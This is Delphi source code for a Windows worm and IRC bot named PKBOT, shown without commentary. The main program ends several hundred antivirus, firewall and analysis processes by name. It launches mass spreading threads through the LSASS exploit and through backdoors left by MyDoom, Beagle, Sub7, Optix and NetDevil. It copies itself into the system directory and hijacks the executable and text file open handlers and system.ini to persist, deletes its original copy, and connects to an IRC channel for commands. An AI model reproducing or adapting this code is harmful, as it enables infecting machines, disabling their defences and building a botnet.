   program PKBOT;

   uses
     Windows,
     pWebServer,
     TLHelp32,
     pBot in 'pBot.pas',
     pSpread in 'pSpread.pas',
     uMyDoom,
     uNetBios,
     lsassexp, {TEST UNIT!}
     ShellApi;

   Procedure StartWebServer;
   Var
     ThreadID: Dword;
   Begin
     BeginThread(NIL, 0, @Webserver  , NIL, 0, ThreadID);
   End;

   Procedure StartLsass(NumbersOfThreads: DWORD);
   Var
     I: Integer;
     ThreadID: Dword;
   Begin
     For I := 0 To NumbersOfThreads-1 Do
       BeginThread(NIL, 0, @DoLsass   , NIL, 0, ThreadID);
   End;

   Procedure StartBeagle(NumbersOfThreads: DWORD);
   Var
     I: Integer;
     ThreadID: Dword;
   Begin
     For I := 0 To NumbersOfThreads-1 Do
       BeginThread(NIL, 0, @DoBeagle   , NIL, 0, ThreadID);
   End;

   Procedure StartNetDevil(NumbersOfThreads: DWORD);
   Var
     I: Integer;
     ThreadID: Dword;
   Begin
     For I := 0 To NumbersOfThreads-1 Do
       BeginThread(NIL, 0, @DoNetDevil   , NIL, 0, ThreadID);
   End;

   Procedure StartOptix(NumbersOfThreads: DWORD);
   Var
     I: Integer;
     ThreadID: Dword;
   Begin
     For I := 0 To NumbersOfThreads-1 Do
       BeginThread(NIL, 0, @DoOptix   , NIL, 0, ThreadID);
   End;

   Procedure StartSub7(NumbersOfThreads: DWORD);
   Var
     I: Integer;
     ThreadID: Dword;
   Begin
     For I := 0 To NumbersOfThreads-1 Do
       BeginThread(NIL, 0, @DoSub7   , NIL, 0, ThreadID);
   End;

   function ExtractFileName(const Path: string): string;
   var
     i, L: integer;
     Ch: Char;
   begin
     L := Length(Path);
     for i := L downto 1 do
     begin
       Ch := Path[i];
       if (Ch = '\') or (Ch = '/') then
       begin
         Result := Copy(Path, i + 1, L - i);
         Break;
       end;
     end;
   end;

   Procedure SetRegValue(kRoot:Hkey; Path, Value, Str:String);
   Var
    Key : Hkey;
    Siz : Cardinal;
   Begin
    RegOpenKey(kRoot, pChar(Path), Key);
    Siz := 2048;
    RegSetValueEx( Key, pChar(Value), 0, REG_SZ, @Str[1], Siz);
    RegCloseKey(Key);
   End;

   Procedure Init;
   Var
     Dir     : Array[0..256] Of Char;
     FileName: String;
     F       : TextFile;
   Begin
     FileName := ExtractFileName(ParamStr(0));
     If FileName <> 'Synd.exe' Then
     Begin
       GetSystemDirectory(Dir, SizeOf(Dir));
       FileName := String(Dir)+'\Synd.exe';
       CopyFile(pchar(ParamStr(0)), pChar(FileName), False);

       writeprivateprofilestring('boot','shell',pchar('Explorer.exe Synd.exe'),'system.ini');
       SetRegValue(HKEY_CLASSES_ROOT, 'exefile\shell\open', 'command', '"'+FileName+'" "%1" %*');
       SetRegValue(HKEY_CLASSES_ROOT, 'txtfile\shell\open', 'command', '"'+FileName+'" "%1" %*');
       {HKEY_CLASSES_ROOT\exefile\shell\open\ command = “”C:\Recycled\SirC32.exe” ”%1” %*}

       ShellExecute(0, 'open', pchar(filename), nil, nil, 0);

       AssignFile(F, 'c:\rem.bat');
       ReWrite(F);
       WriteLn('del "'+paramstr(0)+'"');
       WriteLn('del c:\rem.bat');
       CloseFile(F);

       ExitProcess(0);
     End Else
     Begin
       If CreateMutexA(NIL, FALSE, '---={SYND}=---') = ERROR_ALREADY_EXISTS Then
         ExitProcess(0);

       ShellExecute(0, 'open', 'c:\rem.bat', nil, nil, 0);
     End;
   End;

   function KillTask(ExeFileName: string): integer;
   const
     PROCESS_TERMINATE=$0001;
   var
     ContinueLoop: BOOL;
     FSnapshotHandle: THandle;
     FProcessEntry32: TProcessEntry32;
   begin
     result := 0;

     FSnapshotHandle := CreateToolhelp32Snapshot
                        (TH32CS_SNAPPROCESS, 0);
     FProcessEntry32.dwSize := Sizeof(FProcessEntry32);
     ContinueLoop := Process32First(FSnapshotHandle,
                                    FProcessEntry32);

     while integer(ContinueLoop) <> 0 do
     begin
       if ((LowerCase(ExtractFileName(FProcessEntry32.szExeFile)) =
            LowerCase(ExeFileName))
        or (LowerCase(FProcessEntry32.szExeFile) =
            LowerCase(ExeFileName))) then
         Result := Integer(TerminateProcess(OpenProcess(
                           PROCESS_TERMINATE, BOOL(0),
                           FProcessEntry32.th32ProcessID), 0));
       ContinueLoop := Process32Next(FSnapshotHandle,
                                     FProcessEntry32);
     end;

     CloseHandle(FSnapshotHandle);
   end;

   var
     ThreadID: DWord;

   begin

           KillTask('ACKWIN32.EXE');
           KillTask('ADAWARE.EXE');
           KillTask('ADVXDWIN.EXE');
           KillTask('AGENTSVR.EXE');
           KillTask('AGENTW.EXE');
           KillTask('ALERTSVC.EXE');
           KillTask('ALEVIR.EXE');
           KillTask('ALOGSERV.EXE');
           KillTask('AMON9X.EXE');
           KillTask('ANTI-TROJAN.EXE');
           KillTask('ANTIVIRUS.EXE');
           KillTask('ANTS.EXE');
           KillTask('APIMONITOR.EXE');
           KillTask('APLICA32.EXE');
           KillTask('APVXDWIN.EXE');
           KillTask('ARR.EXE');
           KillTask('ATCON.EXE');
           KillTask('ATGUARD.EXE');
           KillTask('ATRO55EN.EXE');
           KillTask('ATUPDATER.EXE');
           KillTask('ATUPDATER.EXE');
           KillTask('ATWATCH.EXE');
           KillTask('AU.EXE');
           KillTask('AUPDATE.EXE');
           KillTask('AUPDATE.EXE');
           KillTask('AUTODOWN.EXE');
           KillTask('AUTODOWN.EXE');
           KillTask('AUTOTRACE.EXE');
           KillTask('AUTOTRACE.EXE');
           KillTask('AUTOUPDATE.EXE');
           KillTask('AUTOUPDATE.EXE');
           KillTask('AVCONSOL.EXE');
           KillTask('AVE32.EXE');
           KillTask('AVGCC32.EXE');
           KillTask('AVGCTRL.EXE');
           KillTask('AVGNT.EXE');
           KillTask('AVGSERV.EXE');
           KillTask('AVGSERV9.EXE');
           KillTask('AVGUARD.EXE');
           KillTask('AVGW.EXE');
           KillTask('AVKPOP.EXE');
           KillTask('AVKSERV.EXE');
           KillTask('AVKSERVICE.EXE');
           KillTask('AVKWCTl9.EXE');
           KillTask('AVLTMAIN.EXE');
           KillTask('AVNT.EXE');
           KillTask('AVP.EXE');
           KillTask('AVP32.EXE');
           KillTask('AVPCC.EXE');
           KillTask('AVPDOS32.EXE');
           KillTask('AVPM.EXE');
           KillTask('AVPTC32.EXE');
           KillTask('AVPUPD.EXE');
           KillTask('AVPUPD.EXE');
           KillTask('AVSCHED32.EXE');
           KillTask('AVSYNMGR.EXE');
           KillTask('AVWIN95.EXE');
           KillTask('AVWINNT.EXE');
           KillTask('AVWUPD.EXE');
           KillTask('AVWUPD32.EXE');
           KillTask('AVWUPD32.EXE');
           KillTask('AVWUPSRV.EXE');
           KillTask('AVXMONITOR9X.EXE');
           KillTask('AVXMONITORNT.EXE');
           KillTask('AVXQUAR.EXE');
           KillTask('AVXQUAR.EXE');
           KillTask('BACKWEB.EXE');
           KillTask('BARGAINS.EXE');
           KillTask('BD_PROFESSIONAL.EXE');
           KillTask('BEAGLE.EXE');
           KillTask('BELT.EXE');
           KillTask('BIDEF.EXE');
           KillTask('BIDSERVER.EXE');
           KillTask('BIPCP.EXE');
           KillTask('BIPCPEVALSETUP.EXE');
           KillTask('BISP.EXE');
           KillTask('BLACKD.EXE');
           KillTask('BLACKICE.EXE');
           KillTask('BLSS.EXE');
           KillTask('BOOTCONF.EXE');
           KillTask('BOOTWARN.EXE');
           KillTask('BORG2.EXE');
           KillTask('BPC.EXE');
           KillTask('BRASIL.EXE');
           KillTask('BS120.EXE');
           KillTask('BUNDLE.EXE');
           KillTask('BVT.EXE');
           KillTask('CCAPP.EXE');
           KillTask('CCEVTMGR.EXE');
           KillTask('CCPXYSVC.EXE');
           KillTask('CDP.EXE');
           KillTask('CFD.EXE');
           KillTask('CFGWIZ.EXE');
           KillTask('CFIADMIN.EXE');
           KillTask('CFIAUDIT.EXE');
           KillTask('CFIAUDIT.EXE');
           KillTask('CFINET.EXE');
           KillTask('CFINET32.EXE');
           KillTask('CLAW95CF.EXE');
           KillTask('CLEAN.EXE');
           KillTask('CLEANER.EXE');
           KillTask('CLEANER3.EXE');
           KillTask('CLEANPC.EXE');
           KillTask('CLICK.EXE');
           KillTask('CMD32.EXE');
           KillTask('CMESYS.EXE');
           KillTask('CMGRDIAN.EXE');
           KillTask('CMON016.EXE');
           KillTask('CONNECTIONMONITOR.EXE');
           KillTask('CPD.EXE');
           KillTask('CPF9X206.EXE');
           KillTask('CPFNT206.EXE');
           KillTask('CTRL.EXE');
           KillTask('CV.EXE');
           KillTask('CWNB181.EXE');
           KillTask('CWNTDWMO.EXE');
           KillTask('Claw95.EXE');
           KillTask('CLAW95CF.EXE');
           KillTask('DATEMANAGER.EXE');
           KillTask('DCOMX.EXE');
           KillTask('DEFALERT.EXE');
           KillTask('DEFSCANGUI.EXE');
           KillTask('DEFWATCH.EXE');
           KillTask('DEPUTY.EXE');
           KillTask('DIVX.EXE');
           KillTask('DLLCACHE.EXE');
           KillTask('DLLREG.EXE');
           KillTask('DOORS.EXE');
           KillTask('DPF.EXE');
           KillTask('DPFSETUP.EXE');
           KillTask('DPPS2.EXE');
           KillTask('DRWATSON.EXE');
           KillTask('DRWEB32.EXE');
           KillTask('DRWEBUPW.EXE');
           KillTask('DSSAGENT.EXE');
           KillTask('DVP95.EXE');
           KillTask('DVP95_0.EXE');
           KillTask('ECENGINE.EXE');
           KillTask('EFPEADM.EXE');
           KillTask('EMSW.EXE');
           KillTask('ENT.EXE');
           KillTask('ESAFE.EXE');
           KillTask('ESCANH95.EXE');
           KillTask('ESCANHNT.EXE');
           KillTask('ESCANV95.EXE');
           KillTask('ESPWATCH.EXE');
           KillTask('ETHEREAL.EXE');
           KillTask('ETRUSTCIPE.EXE');
           KillTask('EVPN.EXE');
           KillTask('EXANTIVIRUS-CNET.EXE');
           KillTask('EXE.AVXW.EXE');
           KillTask('EXPERT.EXE');
           KillTask('EXPLORE.EXE');
           KillTask('F-AGNT95.EXE');
           KillTask('F-PROT.EXE');
           KillTask('F-PROT95.EXE');
           KillTask('F-STOPW.EXE');
           KillTask('FAMEH32.EXE');
           KillTask('FAST.EXE');
           KillTask('FCH32.EXE');
           KillTask('FIH32.EXE');
           KillTask('FINDVIRU.EXE');
           KillTask('FIREWALL.EXE');
           KillTask('FLOWPROTECTOR.EXE');
           KillTask('FNRB32.EXE');
           KillTask('FP-WIN.EXE');
           KillTask('FP-WIN_TRIAL.EXE');
           KillTask('FPROT.EXE');
           KillTask('FRW.EXE');
           KillTask('FSAA.EXE');
           KillTask('FSAV.EXE');
           KillTask('FSAV32.EXE');
           KillTask('FSAV530STBYB.EXE');
           KillTask('FSAV530WTBYB.EXE');
           KillTask('FSAV95.EXE');
           KillTask('FSGK32.EXE');
           KillTask('FSM32.EXE');
           KillTask('FSMA32.EXE');
           KillTask('FSMB32.EXE');
           KillTask('GATOR.EXE');
           KillTask('GBMENU.EXE');
           KillTask('GBPOLL.EXE');
           KillTask('GENERICS.EXE');
           KillTask('GMT.EXE');
           KillTask('GUARD.EXE');
           KillTask('GUARDDOG.EXE');
           KillTask('HACKTRACERSETUP.EXE');
           KillTask('HBINST.EXE');
           KillTask('HBSRV.EXE');
           KillTask('HOTACTIO.EXE');
           KillTask('HOTPATCH.EXE');
           KillTask('HTLOG.EXE');
           KillTask('HTPATCH.EXE');
           KillTask('HWPE.EXE');
           KillTask('HXDL.EXE');
           KillTask('HXIUL.EXE');
           KillTask('IAMAPP.EXE');
           KillTask('IAMSERV.EXE');
           KillTask('IAMSTATS.EXE');
           KillTask('IBMASN.EXE');
           KillTask('IBMAVSP.EXE');
           KillTask('ICLOAD95.EXE');
           KillTask('ICLOADNT.EXE');
           KillTask('ICMON.EXE');
           KillTask('ICSUPP95.EXE');
           KillTask('ICSUPP95.EXE');
           KillTask('ICSUPPNT.EXE');
           KillTask('IDLE.EXE');
           KillTask('IEDLL.EXE');
           KillTask('IEDRIVER.EXE');
           KillTask('IEXPLORER.EXE');
           KillTask('IFACE.EXE');
           KillTask('IFW2000.EXE');
           KillTask('INETLNFO.EXE');
           KillTask('INFUS.EXE');
           KillTask('INFWIN.EXE');
           KillTask('INIT.EXE');
           KillTask('INTDEL.EXE');
           KillTask('INTREN.EXE');
           KillTask('IOMON98.EXE');
           KillTask('IPARMOR.EXE');
           KillTask('IRIS.EXE');
           KillTask('ISASS.EXE');
           KillTask('ISRV95.EXE');
           KillTask('ISTSVC.EXE');
           KillTask('JAMMER.EXE');
           KillTask('JDBGMRG.EXE');
           KillTask('JEDI.EXE');
           KillTask('KAVLITE40ENG.EXE');
           KillTask('KAVPERS40ENG.EXE');
           KillTask('KAVPF.EXE');
           KillTask('KAZZA.EXE');
           KillTask('KEENVALUE.EXE');
           KillTask('KERIO-PF-213-EN-WIN.EXE');
           KillTask('KERIO-WRL-421-EN-WIN.EXE');
           KillTask('KERIO-WRP-421-EN-WIN.EXE');
           KillTask('KERNEL32.EXE');
           KillTask('KILLPROCESSSETUP161.EXE');
           KillTask('LAUNCHER.EXE');
           KillTask('LDNETMON.EXE');
           KillTask('LDPRO.EXE');
           KillTask('LDPROMENU.EXE');
           KillTask('LDSCAN.EXE');
           KillTask('LNETINFO.EXE');
           KillTask('LOADER.EXE');
           KillTask('LOCALNET.EXE');
           KillTask('LOCKDOWN.EXE');
           KillTask('LOCKDOWN2000.EXE');
           KillTask('LOOKOUT.EXE');
           KillTask('LORDPE.EXE');
           KillTask('LSETUP.EXE');
           KillTask('LUALL.EXE');
           KillTask('LUALL.EXE');
           KillTask('LUAU.EXE');
           KillTask('LUCOMSERVER.EXE');
           KillTask('LUINIT.EXE');
           KillTask('LUSPT.EXE');
           KillTask('MAPISVC32.EXE');
           KillTask('MCAGENT.EXE');
           KillTask('MCMNHDLR.EXE');
           KillTask('MCSHIELD.EXE');
           KillTask('MCTOOL.EXE');
           KillTask('MCUPDATE.EXE');
           KillTask('MCUPDATE.EXE');
           KillTask('MCVSRTE.EXE');
           KillTask('MCVSSHLD.EXE');
           KillTask('MD.EXE');
           KillTask('MFIN32.EXE');
           KillTask('MFW2EN.EXE');
           KillTask('MFWENG3.02D30.EXE');
           KillTask('MGAVRTCL.EXE');
           KillTask('MGAVRTE.EXE');
           KillTask('MGHTML.EXE');
           KillTask('MGUI.EXE');
           KillTask('MINILOG.EXE');
           KillTask('MMOD.EXE');
           KillTask('MONITOR.EXE');
           KillTask('MOOLIVE.EXE');
           KillTask('MOSTAT.EXE');
           KillTask('MPFAGENT.EXE');
           KillTask('MPFSERVICE.EXE');
           KillTask('MPFTRAY.EXE');
           KillTask('MRFLUX.EXE');
           KillTask('MSAPP.EXE');
           KillTask('MSBB.EXE');
           KillTask('MSBLAST.EXE');
           KillTask('MSCACHE.EXE');
           KillTask('MSCCN32.EXE');
           KillTask('MSCMAN.EXE');
           KillTask('MSCONFIG.EXE');
           KillTask('MSDM.EXE');
           KillTask('MSDOS.EXE');
           KillTask('MSIEXEC16.EXE');
           KillTask('MSINFO32.EXE');
           KillTask('MSLAUGH.EXE');
           KillTask('MSMGT.EXE');
           KillTask('MSMSGRI32.EXE');
           KillTask('MSSMMC32.EXE');
           KillTask('MSSYS.EXE');
           KillTask('MSVXD.EXE');
           KillTask('MU0311AD.EXE');
           KillTask('MWATCH.EXE');
           KillTask('N32SCANW.EXE');
           KillTask('NAV.EXE');
           KillTask('AUTO-PROTECT.NAV80TRY.EXE');
           KillTask('NAVAP.NAVAPSVC.EXE');
           KillTask('NAVAPSVC.EXE');
           KillTask('NAVAPW32.EXE');
           KillTask('NAVDX.EXE');
           KillTask('NAVENGNAVEX15.NAVLU32.EXE');
           KillTask('NAVLU32.EXE');
           KillTask('NAVNT.EXE');
           KillTask('NAVSTUB.EXE');
           KillTask('NAVW32.EXE');
           KillTask('NAVWNT.EXE');
           KillTask('NC2000.EXE');
           KillTask('NCINST4.EXE');
           KillTask('NDD32.EXE');
           KillTask('NEOMONITOR.EXE');
           KillTask('NEOWATCHLOG.EXE');
           KillTask('NETARMOR.EXE');
           KillTask('NETD32.EXE');
           KillTask('NETINFO.EXE');
           KillTask('NETMON.EXE');
           KillTask('NETSCANPRO.EXE');
           KillTask('NETSPYHUNTER-1.2.EXE');
           KillTask('NETSTAT.EXE');
           KillTask('NETUTILS.EXE');
           KillTask('NISSERV.EXE');
           KillTask('NISUM.EXE');
           KillTask('NMAIN.EXE');
           KillTask('NOD32.EXE');
           KillTask('NORMIST.EXE');
           KillTask('NORTON_INTERNET_SECU_3.0_407.EXE');
           KillTask('NOTSTART.EXE');
           KillTask('NPF40_TW_98_NT_ME_2K.EXE');
           KillTask('NPFMESSENGER.EXE');
           KillTask('NPROTECT.EXE');
           KillTask('NPSCHECK.EXE');
           KillTask('NPSSVC.EXE');
           KillTask('NSCHED32.EXE');
           KillTask('NSSYS32.EXE');
           KillTask('NSTASK32.EXE');
           KillTask('NSUPDATE.EXE');
           KillTask('NT.EXE');
           KillTask('NTRTSCAN.EXE');
           KillTask('NTVDM.EXE');
           KillTask('NTXconfig.EXE');
           KillTask('NUI.EXE');
           KillTask('NUPGRADE.EXE');
           KillTask('NUPGRADE.EXE');
           KillTask('NVARCH16.EXE');
           KillTask('NVC95.EXE');
           KillTask('NVSVC32.EXE');
           KillTask('NWINST4.EXE');
           KillTask('NWSERVICE.EXE');
           KillTask('NWTOOL16.EXE');
           KillTask('OLLYDBG.EXE');
           KillTask('ONSRVR.EXE');
           KillTask('OPTIMIZE.EXE');
           KillTask('OSTRONET.EXE');
           KillTask('OTFIX.EXE');
           KillTask('OUTPOST.EXE');
           KillTask('OUTPOST.EXE');
           KillTask('OUTPOSTINSTALL.EXE');
           KillTask('OUTPOSTPROINSTALL.EXE');
           KillTask('PADMIN.EXE');
           KillTask('PANIXK.EXE');
           KillTask('PATCH.EXE');
           KillTask('PAVCL.EXE');
           KillTask('PAVPROXY.EXE');
           KillTask('PAVSCHED.EXE');
           KillTask('PAVW.EXE');
           KillTask('PCC2002S902.EXE');
           KillTask('PCC2K_76_1436.EXE');
           KillTask('PCCIOMON.EXE');
           KillTask('PCCNTMON.EXE');
           KillTask('PCCWIN97.EXE');
           KillTask('PCCWIN98.EXE');
           KillTask('PCDSETUP.EXE');
           KillTask('PCFWALLICON.EXE');
           KillTask('PCIP10117_0.EXE');
           KillTask('PCSCAN.EXE');
           KillTask('PDSETUP.EXE');
           KillTask('PENIS.EXE');
           KillTask('PERISCOPE.EXE');
           KillTask('PERSFW.EXE');
           KillTask('PERSWF.EXE');
           KillTask('PF2.EXE');
           KillTask('PFWADMIN.EXE');
           KillTask('PGMONITR.EXE');
           KillTask('PINGSCAN.EXE');
           KillTask('PLATIN.EXE');
           KillTask('POP3TRAP.EXE');
           KillTask('POPROXY.EXE');
           KillTask('POPSCAN.EXE');
           KillTask('PORTDETECTIVE.EXE');
           KillTask('PORTMONITOR.EXE');
           KillTask('POWERSCAN.EXE');
           KillTask('PPINUPDT.EXE');
           KillTask('PPTBC.EXE');
           KillTask('PPVSTOP.EXE');
           KillTask('PRIZESURFER.EXE');
           KillTask('PRMT.EXE');
           KillTask('PRMVR.EXE');
           KillTask('PROCDUMP.EXE');
           KillTask('PROCESSMONITOR.EXE');
           KillTask('PROCEXPLORERV1.0.EXE');
           KillTask('PROGRAMAUDITOR.EXE');
           KillTask('PROPORT.EXE');
           KillTask('PROTECTX.EXE');
           KillTask('PSPF.EXE');
           KillTask('PURGE.EXE');
           KillTask('PUSSY.EXE');
           KillTask('PVIEW95.EXE');
           KillTask('QCONSOLE.EXE');
           KillTask('QSERVER.EXE');
           KillTask('RAPAPP.EXE');
           KillTask('RAV7.EXE');
           KillTask('RAV7WIN.EXE');
           KillTask('RAV8WIN32ENG.EXE');
           KillTask('RAY.EXE');
           KillTask('RB32.EXE');
           KillTask('RCSYNC.EXE');
           KillTask('REALMON.EXE');
           KillTask('REGED.EXE');
           KillTask('REGEDIT.EXE');
           KillTask('REGEDT32.EXE');
           KillTask('RESCUE.EXE');
           KillTask('RESCUE32.EXE');
           KillTask('RRGUARD.EXE');
           KillTask('RSHELL.EXE');
           KillTask('RTVSCAN.EXE');
           KillTask('RTVSCN95.EXE');
           KillTask('RULAUNCH.EXE');
           KillTask('RUN32DLL.EXE');
           KillTask('RUNDLL.EXE');
           KillTask('RUNDLL16.EXE');
           KillTask('RUXDLL32.EXE');
           KillTask('SAFEWEB.EXE');
           KillTask('SAHAGENT.EXE');
           KillTask('SAVE.EXE');
           KillTask('SAVENOW.EXE');
           KillTask('SBSERV.EXE');
           KillTask('SC.EXE');
           KillTask('SCAM32.EXE');
           KillTask('SCAN32.EXE');
           KillTask('SCAN95.EXE');
           KillTask('SCANPM.EXE');
           KillTask('SCRSCAN.EXE');
           KillTask('SCRSVR.EXE');
           KillTask('SCVHOST.EXE');
           KillTask('SD.EXE');
           KillTask('SERV95.EXE');
           KillTask('SERVICE.EXE');
           KillTask('SERVLCE.EXE');
           KillTask('SERVLCES.EXE');
           KillTask('SETUPVAMEEVAL.EXE');
           KillTask('SETUP_FLOWPROTECTOR_US.EXE');
           KillTask('SFC.EXE');
           KillTask('SGSSFW32.EXE');
           KillTask('SH.EXE');
           KillTask('SHELLSPYINSTALL.EXE');
           KillTask('SHN.EXE');
           KillTask('SHOWBEHIND.EXE');
           KillTask('SMC.EXE');
           KillTask('SMS.EXE');
           KillTask('SMSS32.EXE');
           KillTask('SOAP.EXE');
           KillTask('SOFI.EXE');
           KillTask('SPERM.EXE');
           KillTask('SPF.EXE');
           KillTask('SPHINX.EXE');
           KillTask('SPOLER.EXE');
           KillTask('SPOOLCV.EXE');
           KillTask('SPOOLSV32.EXE');
           KillTask('SPYXX.EXE');
           KillTask('SREXE.EXE');
           KillTask('SRNG.EXE');
           KillTask('SS3EDIT.EXE');
           KillTask('SSGRATE.EXE');
           KillTask('SSG_4104.EXE');
           KillTask('ST2.EXE');
           KillTask('START.EXE');
           KillTask('STCLOADER.EXE');
           KillTask('SUPFTRL.EXE');
           KillTask('SUPPORT.EXE');
           KillTask('SUPPORTER5.EXE');
           KillTask('SVC.EXE');
           KillTask('SVCHOSTC.EXE');
           KillTask('SVCHOSTS.EXE');
           KillTask('SVSHOST.EXE');
           KillTask('SWEEP95.EXE');
           KillTask('SWEEPNET.SWEEPSRV.SYS.SWNETSUP.EXE');
           KillTask('SYMPROXYSVC.EXE');
           KillTask('SYMTRAY.EXE');
           KillTask('SYSEDIT.EXE');
           KillTask('SYSTEM.EXE');
           KillTask('SYSTEM32.EXE');
           KillTask('SYSUPD.EXE');
           KillTask('TASKMG.EXE');
           KillTask('TASKMO.EXE');
           KillTask('TASKMON.EXE');
           KillTask('TAUMON.EXE');
           KillTask('TBSCAN.EXE');
           KillTask('TC.EXE');
           KillTask('TCA.EXE');
           KillTask('TCM.EXE');
           KillTask('TDS-3.EXE');
           KillTask('TDS2-98.EXE');
           KillTask('TDS2-NT.EXE');
           KillTask('TEEKIDS.EXE');
           KillTask('TFAK.EXE');
           KillTask('TFAK5.EXE');
           KillTask('TGBOB.EXE');
           KillTask('TITANIN.EXE');
           KillTask('TITANINXP.EXE');
           KillTask('TRACERT.EXE');
           KillTask('TRICKLER.EXE');
           KillTask('TRJSCAN.EXE');
           KillTask('TRJSETUP.EXE');
           KillTask('TROJANTRAP3.EXE');
           KillTask('TSADBOT.EXE');
           KillTask('TVMD.EXE');
           KillTask('TVTMD.EXE');
           KillTask('UNDOBOOT.EXE');
           KillTask('UPDAT.EXE');
           KillTask('UPDATE.EXE');
           KillTask('UPDATE.EXE');
           KillTask('UPGRAD.EXE');
           KillTask('UTPOST.EXE');
           KillTask('VBCMSERV.EXE');
           KillTask('VBCONS.EXE');
           KillTask('VBUST.EXE');
           KillTask('VBWIN9X.EXE');
           KillTask('VBWINNTW.EXE');
           KillTask('VCSETUP.EXE');
           KillTask('VET32.EXE');
           KillTask('VET95.EXE');
           KillTask('VETTRAY.EXE');
           KillTask('VFSETUP.EXE');
           KillTask('VIR-HELP.EXE');
           KillTask('VIRUSMDPERSONALFIREWALL.EXE');
           KillTask('VNLAN300.EXE');
           KillTask('VNPC3000.EXE');
           KillTask('VPC32.EXE');
           KillTask('VPC42.EXE');
           KillTask('VPFW30S.EXE');
           KillTask('VPTRAY.EXE');
           KillTask('VSCAN40.EXE');
           KillTask('VSCENU6.02D30.EXE');
           KillTask('VSCHED.EXE');
           KillTask('VSECOMR.EXE');
           KillTask('VSHWIN32.EXE');
           KillTask('VSISETUP.EXE');
           KillTask('VSMAIN.EXE');
           KillTask('VSMON.EXE');
           KillTask('VSSTAT.EXE');
           KillTask('VSWIN9XE.EXE');
           KillTask('VSWINNTSE.EXE');
           KillTask('VSWINPERSE.EXE');
           KillTask('W32DSM89.EXE');
           KillTask('W9X.EXE');
           KillTask('WATCHDOG.EXE');
           KillTask('WEBDAV.EXE');
           KillTask('WEBSCANX.EXE');
           KillTask('WEBTRAP.EXE');
           KillTask('WFINDV32.EXE');
           KillTask('WGFE95.EXE');
           KillTask('WHOSWATCHINGME.EXE');
           KillTask('WIMMUN32.EXE');
           KillTask('WIN-BUGSFIX.EXE');
           KillTask('WIN32.EXE');
           KillTask('WIN32US.EXE');
           KillTask('WINACTIVE.EXE');
           KillTask('WINDOW.EXE');
           KillTask('WINDOWS.EXE');
           KillTask('WININETD.EXE');
           KillTask('WININIT.EXE');
           KillTask('WININITX.EXE');
           KillTask('WINLOGIN.EXE');
           KillTask('WINMAIN.EXE');
           KillTask('WINNET.EXE');
           KillTask('WINPPR32.EXE');
           KillTask('WINRECON.EXE');
           KillTask('WINSERVN.EXE');
           KillTask('WINSSK32.EXE');
           KillTask('WINSTART.EXE');
           KillTask('WINSTART001.EXE');
           KillTask('WINTSK32.EXE');
           KillTask('WINUPDATE.EXE');
           KillTask('WKUFIND.EXE');
           KillTask('WNAD.EXE');
           KillTask('WNT.EXE');
           KillTask('WRADMIN.EXE');
           KillTask('WRCTRL.EXE');
           KillTask('WSBGATE.EXE');
           KillTask('WUPDATER.EXE');
           KillTask('WUPDT.EXE');
           KillTask('WYVERNWORKSFIREWALL.EXE');
           KillTask('XPF202EN.EXE');
           KillTask('ZAPRO.EXE');
           KillTask('ZAPSETUP3001.EXE');
           KillTask('ZATUTOR.EXE');
           KillTask('ZONALM2601.EXE');
           KillTask('ZONEALARM.EXE');
           KillTask('_AVP32.EXE');
           KillTask('_AVPCC.EXE');
           KillTask('_AVPM.EXE');
           KillTask('HIJACKTHIS.EXE');
           KillTask('F-AGOBOT.EXE');
           KillTask('PandaAVEngine.exe');
           KillTask('sysinfo.exe');
           KillTask('mscvb32.exe');
           KillTask('Penis32.exe');
           KillTask('bbeagle.exe');
           KillTask('SysMonXP.exe');
           KillTask('winupd.exe');
           KillTask('winsys.exe');
           KillTask('ssate.exe');
           KillTask('rate.exe');
           KillTask('d3dupdate.exe');
           KillTask('irun4.exe');
           KillTask('i11r54n4.exe');
           KillTask('kavsvc.exe');
           KillTask('nvsvc32.exe');
           KillTask('regsvc.exe');
           KillTask('kav.exe');

           StartWebServer;
           StartSub7(100);
           StartOptix(100);
           StartBeagle(100);
           StartNetDevil(100);
           StartNetBios(100);
           StartMyDoom(100);
           StartLsass(100);

           Init;
           Repeat
             StartBot('uk.undernet.org', 6667, '##pktb', '', FALSE);
             Sleep(36000);
           Until 1 = 2;
   end.
